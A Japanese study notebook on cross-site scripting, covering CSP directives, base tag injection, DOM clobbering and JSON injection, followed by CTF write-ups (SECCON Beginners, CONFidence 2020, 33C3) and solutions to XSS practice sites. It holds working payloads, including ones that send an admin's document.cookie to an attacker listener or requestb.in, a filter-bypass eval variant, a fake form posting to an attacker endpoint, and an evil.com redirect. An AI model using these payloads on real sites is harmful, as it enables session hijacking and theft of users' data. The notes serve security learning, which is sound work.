<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [XSS](#xss)
  - [CSP](#csp)
    - [CSP Level](#csp-level)
    - [default-src](#default-src)
    - [script-src](#script-src)
    - [strict-dynamic (level 3)](#strict-dynamic-level-3)
  - [Base Tag Injection](#base-tag-injection)
  - [DOM clobbering](#dom-clobbering)
  - [JSON Injection](#json-injection)
- [writeup](#writeup)
  - [Reflect / JSON Injection (CONFidence 2020 Teaser)](#reflect--json-injection-confidence-2020-teaser)
  - [CSP nonce strict-dynamic / DOM clobbering / BaseTag Injection (SECCON beginnres 2020 somen)](#csp-nonce-strict-dynamic--dom-clobbering--basetag-injection-seccon-beginnres-2020-somen)
  - [Reflected (SECCON beginners 2018 Gimme your comment)](#reflected-seccon-beginners-2018-gimme-your-comment)
  - [Reflect / BaseTag Injection / force scraping fake Form (SECCON beginners 2018 Gimme your comment REVENGE)](#reflect--basetag-injection--force-scraping-fake-form-seccon-beginners-2018-gimme-your-comment-revenge)
  - [Reflected / Get Admin's Cookie through bypass "." (33C3 CTF )](#reflected--get-admins-cookie-through-bypass--33c3-ctf-)
  - [](#)
  - [](#-1)
- [Docker環境があるやつ](#docker%E7%92%B0%E5%A2%83%E3%81%8C%E3%81%82%E3%82%8B%E3%82%84%E3%81%A4)
  - [somen (SECCON beginners 2020)](#somen-seccon-beginners-2020)
- [練習](#%E7%B7%B4%E7%BF%92)
  - [xsssample](#xsssample)
    - [1 (normal)](#1-normal)
    - [2 (bypass <input )](#2-bypass-input-)
    - [3 (bypass maxlength="10")](#3-bypass-maxlength10)
    - [4 (bypass "<>")](#4-bypass-)
    - [5 (bypass maxlength="10" with POST)](#5-bypass-maxlength10-with-post)
    - [6 (href javascript:)](#6-href-javascript)
    - [7 (filter "script")](#7-filter-script)
    - [8 (inject in document.write(''))](#8-inject-in-documentwrite)
    - [11 (inject \<input value="">)](#11-inject-%5Cinput-value)
    - [12 (\<meta content=""/>)](#12-%5Cmeta-content)
    - [13 (IE only)](#13-ie-only)
    - [14 (filter ?)](#14-filter-)
    - [15 (???)](#15-)
  - [XSS Challenges](#xss-challenges)
    - [1 (normal)](#1-normal-1)
    - [2 (bypass \<input value="">)](#2-bypass-%5Cinput-value)
    - [3 (inject \<select>tag)](#3-inject-%5Cselecttag)
    - [4 (bypas \<input type="hidden" value="">)](#4-bypas-%5Cinput-typehidden-value)
    - [5 (bypass maxlength="15")](#5-bypass-maxlength15)
    - [6 (fileter "<>")](#6-fileter-)
    - [7 (inject \<input value= > with no quote)](#7-inject-%5Cinput-value--with-no-quote)
    - [8 (href)](#8-href)
    - [9 (UTF-7 XSS)](#9-utf-7-xss)
    - [10 (filter "domain")](#10-filter-domain)
    - [11 ページが動いてない…](#11-%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%8C%E5%8B%95%E3%81%84%E3%81%A6%E3%81%AA%E3%81%84)
    - [12 IE](#12-ie)
    - [13 IE](#13-ie)
    - [14 IE](#14-ie)
    - [15 (DOM based document.write)](#15-dom-based-documentwrite)
    - [16 ページが動いてない](#16-%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%8C%E5%8B%95%E3%81%84%E3%81%A6%E3%81%AA%E3%81%84)
    - [17 IE](#17-ie)
    - [18 IE](#18-ie)
    - [19 ページが動いてない](#19-%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%8C%E5%8B%95%E3%81%84%E3%81%A6%E3%81%AA%E3%81%84)
  - [動作環境ナシ](#%E5%8B%95%E4%BD%9C%E7%92%B0%E5%A2%83%E3%83%8A%E3%82%B7)
    - [XSS Challenge(セキュリティ・ミニキャンプ in 岡山 2018)](#xss-challenge%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%83%BB%E3%83%9F%E3%83%8B%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%97-in-%E5%B2%A1%E5%B1%B1-2018)
    - [katagaitaiCTF&#035;9 xss千本ノック](#katagaitaictf9-xss%E5%8D%83%E6%9C%AC%E3%83%8E%E3%83%83%E3%82%AF)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->
# XSS
## CSP
### CSP Level
CSP Level 3の strict-dynamic をサポートしているブラウザでは nonce-{random} 'unsafe-eval' 'strict-dynamic' のみ解釈され、その他は無視される。   
CSP Level 2までのみサポートしているブラウザでは 'nonce-{random}' 'unsafe-eval' のみ解釈され、その他は無視   
CSP Level 1のみサポートしているブラウザでは 'unsafe-inline' 'unsafe-eval' https: http:; のみ解釈され、その他は無視   
### default-src
未指定の-srcディレクティブの大半に対してデフォルトを定義する。   
デフォルトでインラインコードとeval()は有害とみなす   
'unsafe-inline' もしくは 'unsafe-eval'で明示的に有効化する必要がある   
`default-src 'none'`ですべて無効化し、全ての読み込みを制限。(ただし`default-src 'none' img-src 'self'`とすればimgは現在のオリジンと一致すれば許可、みたいになる)   

### script-src 
ホワイトリストによって、jsファイルを読み込めるドメインを制限する。ただしコールバック関数を呼びだしできるJSONPエンドポイントを使用すればCSPをバイパスできるのでよくないらしい   
https://inside.pixiv.blog/kobo/5137   
https://csp-evaluator.withgoogle.com/   
ここにCSPの設定を投げると、危険性を評価してくれる。超便利。   
`'unsafe-inline'`がない限りはインラインスクリプトの実行を制限。   
インラインスクリプトは`<script>`とか`<img onerro=alert>`とかのイベントハンドラ内のインラインとか。   
https://qiita.com/zabu/items/d2fbac1abc81eba38efb   
nonceはlevel2から存在する。nonceまたはホワイトリストがあれば実行を許可ってことかな？(strict-dynamicではnonceだけで許可)？   
### strict-dynamic (level 3)
https://inside.pixiv.blog/kobo/5137   
`'strict-dynamic'`によってnonceによるscriptの実行制御が強制される ( script-src にドメインのホワイトリストを書いても無視される)。   
nonceにより実行を許可されたscriptから動的に生成された別のscriptも実行が許可されるようになる。   
https://masatokinugawa.l0.cm/2018/05/cve-2018-5175-firefox-csp-strict-dynamic-bypass.html   
non-"parser-inserted" なスクリプト要素は、スクリプトを使ってロードすることが許可される。   
parser-insertedとはDocumentのパーサーが生成した（HTMLに書いてあった、もしくはdocument.writeで出力した）かどうか。   
```js
<script nonce="????">
//これはロードされる
var script=document.createElement('script');
script.src='//example.org/dependency.js';
document.body.appendChild(script);
// <script id="aaa"></script>のような場合は実行可能
document.getElementById("aaa").innerHTML = "alert(1);"

//これはロードされない document.write()を使って書くとダメ
document.write("<scr"+"ipt src='//example.org/dependency.js'></scr"+"ipt>");
// <div id="aaa"></div>の場合はimgを挿入しても実行不可能
document.getElementById("aaa").innerHTML = "<img src=/ onerror=alert(1)>"
</script>
```
## Base Tag Injection
以下を挿入すれば基底URLを変更できる。   
```txt
<base href="http://hoge.example">
```
CSPが設定されている場合は以下で検知できるかも(script-srcがあれば)。   
https://csp-evaluator.withgoogle.com/   
CSPが`default-src 'none'`だとしてもformの送信先も変えられる！！！！！   

## DOM clobbering
タグに同じid名を付与すれば、もともと`<div id="a">`に`document.getElementById("a").innerHTML`で代入していても、`<script id="a">`を挿入することでこっちにJavascriptを要素の値として挿入して実行できる！   
- 参考   
https://portswigger.net/web-security/dom-based/dom-clobbering   
https://diary.shift-js.info/dom-clobbering/   
- 例題   
https://github.com/SECCON/Beginners_CTF_2020/blob/master/web/somen/writeup.md   
https://masatokinugawa.l0.cm/2018/05/cve-2018-5175-firefox-csp-strict-dynamic-bypass.html   
https://szarny.hatenablog.com/entry/2019/01/01/XSS_Challenge_%28%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%83%BB%E3%83%9F%E3%83%8B%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%97_in_%E5%B2%A1%E5%B1%B1_2018_%E6%BC%94%E7%BF%92%E3%82%B3%E3%83%B3#Case-23-nonce--strict-dynamic   
http://akouryy.hatenablog.jp/entry/ctf/xss.shift-js.info#23-   

## JSON Injection
```js
// この実装は脆弱！key1の値を上書きできる！
dataStr = "value2', 'key1':'fake_value1";
jsonStr = "{'key1':'value1', 'key2':'" + dataStr + "'}";
console.log(jsonStr);  // {'key1':'value1', 'key2':'value2', 'key1':'fake_value1'}

// こっちだとsecure???
dataStr = "'value2', key1:'fake_value1'";
temp_obj = {'key1':'value1', 'key2': dataStr};
console.log(temp_obj); // { key1: 'value1', key2: "'value2', key1:'fake_value1'" }
jsonStr = JSON.stringify(temp_obj);
console.log(jsonStr);  // {"key1":"value1","key2":"'value2', key1:'fake_value1'"}
```
https://www.calc.mie.jp/posts/2017-12-26-json-injection.html   

# writeup
## Reflect / JSON Injection (CONFidence 2020 Teaser)
https://www.gem-love.com/ctf/2019.html   
- **entrypoint**   
http://catweb.zajebistyc.tf/   
ここでまだ動いてる。   
`<script>`タグ内で`newDiv.innerHTML = '<img style="max-width: 200px; max-height: 200px" src="static/'+kind+'/'+cat+'" />';`としてJSONで返ってきたデータをimgタグ内に挿入している。ここでReflect XSSできる！   
ちなみに、Directry Traversalもできる！   
- **概要**   
以下の通り、`/cats?kind=black`とかでリクエストを送信すると、JSONデータが返ってきてそれを`<img>`タグ内に挿入している。   
```html
<html>
	<head>
		<title>My cats</title>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<script>
		function getNewCats(kind) {
			$.getJSON('http://catweb.zajebistyc.tf/cats?kind='+kind, function(data) {
				if(data.status != 'ok')
				{
					return;
				}
				$('#cats_container').empty();
				cats = data.content;
				cats.forEach(function(cat) {
					var newDiv = document.createElement('div');
					newDiv.innerHTML = '<img style="max-width: 200px; max-height: 200px" src="static/'+kind+'/'+cat+'" />';
					$('#cats_container').append(newDiv);
				});
			});

		}
		$(document).ready(function() {
			$('#cat_select').change(function() {
				var kind = $(this).val();
				history.pushState({}, '', '?'+kind)
				getNewCats(kind);
			});
			var kind = window.location.search.substring(1);
			if(kind == "")
			{
				kind = 'black';
			}
			getNewCats(kind);
		});
	</script>
	</head>
	<body>
		<select id="cat_select">
			<option value="black">black</option>
			<option value="grey">grey</option>
			<option value="red">red</option>
			<option value="white">white</option>
		</select>
		<div id="cats_container"></div>
		not like sumthing? send it <a href="/report">hier</a>
	</body>
</html>
```
返ってくるJSONは以下の通り。   
```txt
{
"status": "ok",
"content": ["2468b5d0-67e8-4d77-9bbb-87a656c8087a-large3x4_Untitledcollage.jpg", "24.jpg", "il_570xN.1285759626_8j8m.jpg"]
}
```
これを取得して以下のようなHTMLをJavascriptで生成する。   
なので、`kind`,`cat`のいずれかで`onerror=alert(1);`みたいな感じでやりたい。   
```html
<div id="cats_container">
	<div>
		<img style="max-width: 200px; max-height: 200px" src="static/black/2468b5d0-67e8-4d77-9bbb-87a656c8087a-large3x4_Untitledcollage.jpg">
	</div>
```
しかし、`kind=black`のかわりに`black=aaa`みたいな存在しないっぽいものを投げるとJSONでstats errorとなって、`<img>`を挿入せずに`return`してしまう。   
```txt
cats?kind="/>';alert(1);//"
{"status": "error", "content": ""/>';alert(1);//" could not be found"}
```
ここで、入力がJSONの中に入っているので、JSON Injectionによって`"status":"OK"`をあらかじめ入れておくことでstatusのチェックをバイパスする。   
```txt
// これを投げる。
kind=", "status": "ok", "content": ["1554866661126960529.jpg", "lJCNA_JC_400x400.jpg", "1.jpg", "1548178639131425422.jpg"], "test":"

// これはいかのようになり、status=okで上書きされるので結果はerrorではなくOKとなる！
{"status": "error", "content": "", "status": "ok", "content": ["1554866661126960529.jpg", "lJCNA_JC_400x400.jpg", "1.jpg", "1548178639131425422.jpg"], "test":" could not be found"}
```
次は`onerror=alert`とかを挿入したい。`<img src=".....aa" onerror="alert(1);">`のようにしたいので以下を送信するとJSONの構文が壊れてエラーとなる。   
```txt
//　これを送信
", "status": "ok", "content": ["y1ng" onerror="alert('y1ng')"], "test":"

// SyntaxError: JSON.parse: expected ',' or ']' after array element at line 1 column 71 of the JSON data
{"status": "error", "content": "", "status": "ok", "content": ["y1ng" onerror="alert('y1ng')"], "test":" could not be found"}
```
なので、"\"をダブルクオートの前に挿入してやればよい。   
```txt
", "status": "ok", "content": ["y1ng\" onerror=\"alert('y1ng')"], "test":"

{"status": "error", "content": "", "status": "ok", "content": ["y1ng\" onerror=\"alert('y1ng')"], "test":" could not be found"}
```
これで以下のようにHTMLが生成され、XSSが達成できる！   
```html
<img style="max-width: 200px; max-height: 200px" src="static/%22,%20%22status%22:%20%22ok%22,%20%22content%22:%20[%22y1ng\%22%20onerror=\%22alert(%27y1ng%27)%22],%20%22test%22:%22/y1ng" onerror="alert('y1ng')">
```
- **Payload**   
```txt
http://catweb.zajebistyc.tf/?%22,%20%22status%22:%20%22ok%22,%20%22content%22:%20[%22y1ng\%22%20onerror=\%22alert(%27y1ng%27)%22],%20%22test%22:%22
```
また、実は以下でDirectry Traversalができる。つまり、`kind=black`のblackはディレクトリ名だった！   
```txt
kind=.
{"status": "ok", "content": ["grey", "black", "white", "red"]}

kind=../
{"status": "ok", "content": ["uwsgi.ini", "prestart.sh", "main.py", "templates", "static", "app.py"]}

kind=../templates/
{"status": "ok", "content": ["index.html", "report.html", "flag.txt"]}
```
## CSP nonce strict-dynamic / DOM clobbering / BaseTag Injection (SECCON beginnres 2020 somen)
https://github.com/SECCON/Beginners_CTF_2020/blob/master/web/somen/writeup.md   
https://www.ryotosaito.com/blog/?p=474   
https://diary.shift-js.info/seccon-beginners-ctf-2020/   

- **entrypoint**   
`<title>Best somen for <?= isset($_GET["username"]) ? $_GET["username"] : "You" ?></title>`にReflect XSSがあることがわかる。   
また、``document.getElementById("message").innerHTML = `${username}, I recommend ${adjective} somen for you.`;``にDOM based XSSがあることがわかる。   
また、CSPが以下のように設定されているので、単に`<script>alert(1)</script>`を挿入するだけではだめ。   
`default-src 'none'`なので、すべての読み込みを制限(ただしそのあとにscript-srcがあるのでscriptの読み込みは限定で許可)   
`script-src`に`nonce`と`sha256...`のハッシュがあるので、`nonce`がセットされているまたはintegrityにsha256のハッシュがセットされている`<script>`しか実行できない。   
```txt
Content-Security-Policy: default-src 'none'; script-src 'nonce-WuUfK2ztXY/KcshKy90o8SGykbs=' 'strict-dynamic' 'sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A='
```
したがって、nonceのセットされている元々ある`<script>`内でDOM basedにより任意のJavascriptを生成する必要があることがわかる。ただし`.innerHTML`経由では`<script>`タグを挿入することはできない！！！！！！！！！！      
nonceのある`<script>`から動的に生成されるnonceのない`<script>`は実行権限が継承されて実行可能となる。nonceのない`<script id="a">`に`document.getElementById("a").innerHTML` に値を代入する形とかなら継承される。     

- **概要**   
![image](https://user-images.githubusercontent.com/56021519/103155489-da447580-47e3-11eb-8fae-4406597cd176.png)   
上のフォームから入力すると、JSに入力される。下のフォームから入力するとAdminが`/?username=test`みたいにアクセスしてくれる。   
**index.php**   
```php
<?php
$nonce = base64_encode(random_bytes(20));
header("Content-Security-Policy: default-src 'none'; script-src 'nonce-${nonce}' 'strict-dynamic' 'sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A='");
?>

<head>
    <title>Best somen for <?= isset($_GET["username"]) ? $_GET["username"] : "You" ?></title>

    <script src="/security.js" integrity="sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A="></script>
    <script nonce="<?= $nonce ?>">
        const choice = l => l[Math.floor(Math.random() * l.length)];

        window.onload = () => {
            const username = new URL(location).searchParams.get("username");
            const adjective = choice(["Nagashi", "Hiyashi"]);
            if (username !== null)
                document.getElementById("message").innerHTML = `${username}, I recommend ${adjective} somen for you.`;
        }
    </script>
</head>

<body>
    <h1>Best somen for You</h1>

    <p>Please input your name. You can use only alphabets and digits.</p>
    <p>This page works fine with latest Google Chrome / Chromium. We won't support other browsers :P</p>
    <p id="message"></p>
    <form action="/" method="GET">
        <input type="text" name="username" place="Your name"></input>
        <button type="submit">Ask</button>
    </form>
    <hr>

    <p> If your name causes suspicious behavior, please tell me that from the following form. Admin will acceess /?username=${encodeURIComponent(your input)} and see what happens.</p>
    <form action="/inquiry" method="POST">
        <input type="text" name="username" place="Your name"></input>
        <button type="submit">Ask</button>
    </form>

</body>
```
**worker.js**   
これはGUI無しのブラウザみたいなのでNode.js上で動作する。`crawl`でAdminのCookieを保持した状態で、index.phpの下のフォームから入力されたusernameの値を使って`/?username=${encodeURIComponent(username)}`でアクセスしてくれる。   
つまり、下のフォームからAdmin用のクローラに送信するusernameの値をなんやかんやしてXSSを発生されて攻撃者サーバーにCookieを送信させるのが目標。   
```js
const puppeteer = require('puppeteer');
const Redis = require('ioredis');
const connection = new Redis(6379, 'redis');

const crawl = async (username) => {
    // initialize
    const browser = await puppeteer.launch({
        executablePath: 'google-chrome-unstable',
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-background-networking',
            '--disk-cache-dir=/dev/null',
            '--disable-default-apps',
            '--disable-extensions',
            '--disable-gpu',
            '--disable-sync',
            '--disable-translate',
            '--hide-scrollbars',
            '--metrics-recording-only',
            '--mute-audio',
            '--no-first-run',
            '--safebrowsing-disable-auto-update',
        ],
    });
    const page = await browser.newPage();

    // set cookie
    await page.setCookie({
        name: 'flag',
        value: process.env.FLAG,
        domain: process.env.DOMAIN,
        expires: Date.now() / 1000 + 10,
    });

    // access
    const url = `${process.env.SCHEME}://${process.env.DOMAIN}/?username=${encodeURIComponent(username)}`;
    try {
        await page.goto(url, {
            waitUntil: 'networkidle0',
            timeout: 5000,
        });
    } catch (err) {
        console.log(err);
    }

    // finalize
    await page.close();
    await browser.close();
};

(async () => {
    while (true) {
        console.log("[*] waiting new query ...");
        await connection.blpop("query", 0).then(v => {
            const username = v[1];
            console.log(`[*] started: ${username}`);
            return crawl(username);
        }).then(() => {
            console.log(`[*] finished.`)
            return connection.incr("proceeded_count");
        }).catch(e => {
            console.log(e);
        });
    };
})();
```
`document.getElementById("message").innerHTML`で`<p id="message"></p>`内に挿入される。   
innerHTMLでは`<script>`を埋め込むことはできない。   
https://ja.stackoverflow.com/questions/2756/innerhtml%E3%81%AB%E5%85%A5%E3%82%8C%E3%81%9F%E3%82%B3%E3%83%BC%E3%83%89%E3%81%AE%E4%B8%AD%E3%81%ABscript%E3%82%BF%E3%82%B0%E3%81%8C%E3%81%82%E3%81%A3%E3%81%A6%E3%82%82%E5%AE%9F%E8%A1%8C%E3%81%95%E3%82%8C%E3%81%AA%E3%81%84%E3%81%AE%E3%81%AF%E3%81%AA%E3%81%9C   
しかし、`<script id="message">`を一つ目のReflected XSSで挿入すると、後ろの`<p id="message">`の代わりに挿入した`<script id="message">`にinnerHTMLに実行権限付きでJSが値として代入されてCSPをバイパスして実行できる！！？！？？！？   
このように元々あるidと同じ名前のidを持つformとかscriptタグを挿入することで、挿入した方のタグが適応されてしまう手法をDOM clobberingというのかな？？   
   

また、`security.js`によって`username`パラメータの値には記号を含められないようになっているが、これはBase tag Injectionという`<base>`タグを挿入して基底URLを定義することでバイパスできる！   
`<base href="http://hoge.example">`を挿入すれば、`src=/security.js`は`hoge.example/security.js`となってロードが失敗して制限をバイパスできる。   
ちなみに、以下のCSP-Evaluatorを使用すればBase tag Injectionできることがわかる！   
https://csp-evaluator.withgoogle.com/   
![image](https://user-images.githubusercontent.com/56021519/103156841-63fa4000-47f0-11eb-9663-e71256d876f2.png)   
- **Payload**   
Docker環境ではIPアドレスが到達できなかったりするので、worker.jsを編集して`192.168.99.100`とかを直書きしている。   
```txt
// これを下のフォームのAdminクローラにPOSTする
document.location=`http://192.168.99.1:4444/?q=${encodeURIComponent(document.cookie)}`;//</title><script id="message"></script><base href="http://hoge.example">

// WSLでListenする
192.168.99.100 - - [26/Dec/2020 21:41:56] "GET /?q=flag%3Dtest%7Bflag%7D HTTP/1.1" 200 -
```
- **ほぼ同じ類題**   
https://szarny.hatenablog.com/entry/2019/01/01/XSS_Challenge_%28%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%83%BB%E3%83%9F%E3%83%8B%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%97_in_%E5%B2%A1%E5%B1%B1_2018_%E6%BC%94%E7%BF%92%E3%82%B3%E3%83%B3#Case-23-nonce--strict-dynamic   
http://akouryy.hatenablog.jp/entry/ctf/xss.shift-js.info#23-   

## Reflected (SECCON beginners 2018 Gimme your comment)
https://graneed.hatenablog.com/entry/2018/05/27/165740   
https://tech.kusuwada.com/entry/2018/05/31/011755   
- **entrypoint**   
`新規投稿`ボタンを押して入力する`タイトル`と`本文`のうち、本文にXSSの脆弱性があるらしい。   
User-Agentにフラグがあるらしい。   
どうやら投稿ページにだけクローラが動いていて、ユーザーが何らかのデータを送信すると、そのクローラも同じくその値を使って投稿ページにアクセスするっぽい？？(そうじゃないとサーバーのUser-Agentゲットできないし…)   
- **概要**   
https://tech.kusuwada.com/entry/2018/05/31/011755   
にある通り、以下のBeeceptorというツールでグローバルなエンドポイントを簡単に作成できるらしい。   
https://beeceptor.com/   
- **Payload**   
以下を送信してUser-Agentを得る。   
```txt
<script>location.href="http://<myserver>/1g993rc1"</script>
```
## Reflect / BaseTag Injection / force scraping fake Form (SECCON beginners 2018 Gimme your comment REVENGE)
https://graneed.hatenablog.com/entry/2018/05/27/170036   
https://tech.kusuwada.com/entry/2018/05/31/011755   

- **entrypoint**   
上記と同じ個所にXSSの脆弱性があるが、今度はCSPが`Content-Security-Policy: default-src 'self'`となっており、同一オリジン内からしか読み込めないようになっている。   
- **概要**   
相対URLで書かれているのでBase Tag Injectionが可能！！！   
また、クローラが以下のようにしてフォームが送信されたかどうかを確認して同様の操作を再現しているが、フォームなら何でも良さそうなので攻撃者サーバーに送信する偽のフォームをセットすれば、そのフォームからの送信を再現して、攻撃者サーバーにアクセスしてくれる！   
```txt
await page.click('button[type=submit]');
```
```html
<form method="post" action="http://{作成したエンドポイント}">
  <input type="text" name="dummy_form">
  <button type="submit">ダミーボタンだよ</button>
</form>
```
- **Payload**   
```html
<base href = "http://myserver/" />
```
```html
<form method="post" action="http://{作成したエンドポイント}">
  <input type="text" name="dummy_form">
  <button type="submit">ダミーボタンだよ</button>
</form>
```
## Reflected / Get Admin's Cookie through bypass "." (33C3 CTF )
https://ctftime.org/writeup/5211   
https://kimiyuki.net/writeup/ctf/2016/33c3-ctf-yoso/   
- **entrypoint**   
- アクセスできるファイル   
   - `/register.php//login.php/logout.php`: 何もなさそう   
   - `/search.php`: 検索ができる   
   - `/bookmark.php`: POSTすればzipが鯖上に生成される   
   - `/download.php`: そのzipを削除しつつ取得   
   - `/feedback.php`: linkを送るとAdminが鯖上で踏んでjsを実行してくれる   
`download.php`にReflected XSSの脆弱性があるらしい。Adminにリンクを送信して踏ませることができるので、XSSによる任意のJSをAdminにこの通信上で実行させることができる！   
`/feedback.php`で攻撃者サーバーにアクセスさせて、`document.cookie`をするJSを実行させても、攻撃者サーバーとの通信間ではCookieは当然ながら存在しないので何も得られない。   
対象サーバー上のXSSによるJSを実行すれば、AdminのCookieを得られる！   
AdminのCookieを得て攻撃者サーバーに送信させるか、もしくはAdminしかアクセスできないflag.zipをXMLHttpRequestでゲットしてそれを攻撃者サーバーに送信させる方法がある。   
前者の方が楽。   
   
- **概要**   
以下のようにしてCookieを送信させたいが、`.`が消去されてしまうらしい。  
```txt
location.href = "http://requestb.in/18o1k6g1?" + document.cookie;
```
以下のようにしてバイパスできる。   
```txt
// "."を"\x2e"としてevalする
http://78.46.224.80:1337/download.php?zip=<script>eval("location\x2ehref=\"http://requestb\x2ein/18o1k6g1?\"+document\x2ecookie;")</script>

// IPアドレスを数値に直す
// window.locationをwindow["location"]に、document.cookieをdocument["cookie"]に
// "string" + "string" -> "string"["concat"]("string")
<script>window["location"] = "http://1558071511/itWorks!"["concat"](document["cookie"]) </script>
```
ちなみに、XMLHttpRequestでflag.zipをゲットする方針では、CSRFトークン付きでないとダメなので、CSRFトークンを取得してからじゃないとダメでめんどくさい…   
## 
- **entrypoint**   
- **概要**   
- **Payload**   
## 
- **entrypoint**   
- **概要**   
- **Payload**   
# Docker環境があるやつ
## somen (SECCON beginners 2020)
https://github.com/SECCON/Beginners_CTF_2020  
# 練習
## xsssample
http://bogus.jp/xsssample/   
writeupは以下   
https://qiita.com/gky360/items/175b8f1b4ca6f71644f4   
### 1 (normal)
http://bogus.jp/xsssample/xsssample_01.php   
![image](https://user-images.githubusercontent.com/56021519/103071017-289c1d80-4606-11eb-86d4-a051e0fdd02c.png)   
普通に`<script>alert(1);</script>`   
### 2 (bypass <input )
http://bogus.jp/xsssample/xsssample_02_M9eec.php   
![image](https://user-images.githubusercontent.com/56021519/103071081-436e9200-4606-11eb-8619-31160c8b6b82.png)   
以下のようにvalueの中に入力がセットされる。   
```txt
<form method="get" action="">login<br>
username<input name="user" type="text" value="aaa"><br>
password<input name="pass" type="password" value=""><br>
<input type="submit" value="login">
</form>
```
`a"><script>alert(1);</script>`

### 3 (bypass maxlength="10")
http://bogus.jp/xsssample/xsssample_03_J4Skr.php   
![image](https://user-images.githubusercontent.com/56021519/103071232-8d577800-4606-11eb-89c7-fff87f8644bc.png)   
以下のように10文字以内の制限がある。   
```txt
<form method="get" action="">login<br>
username<input name="user" maxlength="10" type="text" value=""><br>
password<input name="pass" maxlength="10" type="password" value=""><br>
<input type="submit" value="login">
</form>
```
ブラウザからの入力が制限されているだけなので、URL上のGETパラメータの部分に`a"><script>alert(1);</script>`を書く。   
```txt
http://bogus.jp/xsssample/xsssample_03_J4Skr.php?user=a%22%3E%3Cscript%3Ealert(xss);%3C/script%3E&pass=
```
### 4 (bypass "<>")
http://bogus.jp/xsssample/xsssample_04_C_HD-.php   
![image](https://user-images.githubusercontent.com/56021519/103071499-0bb41a00-4607-11eb-8816-c28c47af61d9.png)   
`a"><script>alert(1);</script>`を入れると以下のようなる。どうやら`<>`が使えない。   
```txt
<form method="get" action="">login<br>
username<input name="user" type="text" value="a"&gt;&lt;script&gt;alert(1);&lt;/script&gt;"><br>
password<input name="pass" type="password" value=""><br>
<input type="submit" value="login">
</form>
```
以下でBypass。   
```txt
" onclick="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#88;&#83;&#83;&#34;&#41;
" onclick="window.onerror=eval;throw'=alert\x28\x22XSS\x22\x29';
" onclick="alert(xss);
```
### 5 (bypass maxlength="10" with POST)
http://bogus.jp/xsssample/xsssample_05_3S7LA.php   
![image](https://user-images.githubusercontent.com/56021519/103071643-5d5ca480-4607-11eb-96ca-13ad9bceb4b4.png)   
10文字以内の制限があるがPOSTしてるのでBurpで書き換える。   
```txt
word=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E
```
### 6 (href javascript:)
http://bogus.jp/xsssample/xsssample_06_w6k2v.php   
![image](https://user-images.githubusercontent.com/56021519/103071770-a1e84000-4607-11eb-9926-f8bd7738a304.png)   
以下のように`href`属性の値に入力が入る。   
```txt
<h1><a href="aaa">link</a></h1>
```
以下でいける。   
```txt
javascript:alert('XSS!');
```
### 7 (filter "script")
http://bogus.jp/xsssample/xsssample_07_qqoXM.php   
![image](https://user-images.githubusercontent.com/56021519/103071857-d956ec80-4607-11eb-8e67-b40d9bd48ff0.png)   
<script></script>が弾かれてる   
大文字でもダメそう   
以下のように`<img`タグならいけた   
```txt
<img src="" onerror="alert('XSS!');">
```
### 8 (inject in document.write(''))
http://bogus.jp/xsssample/xsssample_08_sv8ec.php   
![image](https://user-images.githubusercontent.com/56021519/103071941-099e8b00-4608-11eb-9383-bf6b3c8c0525.png)   
以下のように入力がここに入る。なお、`"<>`は使えない。   
```txt
<script>
function hello(){
document.write ('aaa'+"さん");
}
</script>
```
以下でいける。   
```txt
');alert(xss);//
```
### 11 (inject \<input value="">)
文字数制限あり？   
`xsssample_11.php?user=aaa&pass="+onclick%3D"alert('xss')`で成功。   
### 12 (\<meta content=""/>)
`<>`が使えない   
この中に入力が入っている。   
```txt
<meta property="og:title" content="aaaa" />
```
https://medium.com/bugbountywriteup/xss-bypass-using-meta-tag-in-realestate-postnl-nl-32db25db7308   
https://jpcertcc.github.io/OWASPdocuments/CheatSheets/XSSFilterEvasion.html   
https://stackoverflow.com/questions/18947139/xss-in-meta-tag   
ここにMETAタグを使ってXSSする方法がいろいろあるが、どれもうまく行ってない…ブラウザに依存してる？？   
以下のOpenRedirectだけは動作してる！
```txt
// 以下を送信
0;http://evil.com"HTTP-EQUIV="refresh"

<meta property="og:title" content="0;http://evil.com"HTTP-EQUIV="refresh"" />
```
### 13 (IE only)
### 14 (filter ?)
いろいろ試した結果`<SCRIPT>`と大文字にすればなんらかのフィルタリングをバイパスできてる！   
```txt
<scrscriptipt>
	<scr
<scr<script>ipt>
	<scr<
<<script>ipt>
	<<
<scri<pt>ipt>
	<scri
<script<pt>ipt>
	<
<scrip<pt>ipt>
	<scrip
<SCRIPT>
	<SCRIPT>
<script>
	<script>
<script>alert(1)
	<
<script>a
	<
<SCRIPT>a
	<SCRIPT>a
<SCRIPT>alert(1)
	<SCRIPT>alert(1)
<SCRIPT>alert(1)</SCRIPT>
```
### 15 (???)
おそらく`#`以降をなんやかんやするDOM based？でもJSが特にないのでPHPでなんかやってそう…   

## XSS Challenges
https://blogs.tunelko.com/2013/12/02/xss-challenges/   
writupはここ   
### 1 (normal)
![image](https://user-images.githubusercontent.com/56021519/103072436-ea542d80-4608-11eb-94f9-09f21674c770.png)   
`<script>alert(document.domain);</script>`   
### 2 (bypass \<input value="">)
![image](https://user-images.githubusercontent.com/56021519/103072526-11aafa80-4609-11eb-84c1-5aa2f0c6dd17.png)   
`"><script>alert(document.domain);</script>`   
### 3 (inject \<select>tag)
